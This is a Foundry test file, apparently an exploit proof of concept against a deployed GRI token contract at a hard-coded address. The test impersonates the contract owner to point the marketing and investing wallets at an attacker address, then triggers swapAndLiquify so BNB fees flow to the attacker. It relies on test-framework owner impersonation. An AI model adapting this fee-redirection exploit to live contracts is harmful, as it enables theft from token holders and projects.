// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGRI {
    function owner() external view returns (address);
    function setMarketingWallet(address) external;
    function setInvestingWallet(address) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);
    IGRI token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IGRI(TARGET);
        owner = token.owner();
        vm.label(owner, "Owner");
        vm.label(address(token), "GRI Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker BNB balance
        uint256 initialBalance = attacker.balance;

        // Impersonate owner to change wallet addresses
        vm.startPrank(owner);
        token.setMarketingWallet(attacker);
        token.setInvestingWallet(attacker);
        vm.stopPrank();

        // Get some tokens to work with
        deal(address(token), attacker, 10000 * 1e18);

        // Transfer tokens to contract to accumulate balance (need >= _minTokenBalance = 1e18)
        token.transfer(TARGET, 5 * 1e18);

        // Now trigger swapAndLiquify by making another transfer
        // The contract now has tokens, so a transfer will trigger swapAndLiquify
        token.transfer(address(0xdead), 1 * 1e18);

        // Check attacker balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should increase");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

